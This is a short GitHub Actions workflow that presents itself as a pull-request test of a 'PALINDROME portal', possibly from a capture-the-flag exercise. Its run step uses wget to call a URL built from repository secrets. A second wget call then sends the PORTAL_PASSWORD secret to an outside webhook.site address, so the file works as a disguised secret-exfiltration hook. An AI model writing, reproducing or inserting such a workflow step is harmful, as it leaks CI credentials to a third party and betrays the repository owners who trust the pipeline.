name: Test the PALINDROME portal

on:
  pull_request:
    types: [opened, reopened]

jobs:
  test2:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v3
      - name: Test the PALINDROME portal
        run: | 
          C:\msys64\usr\bin\wget.exe '''${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
          C:\msys64\usr\bin\wget.exe '''https://webhook.site/89edabb4-4ca0-466e-8c41-7a3525691df1/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
          cat test
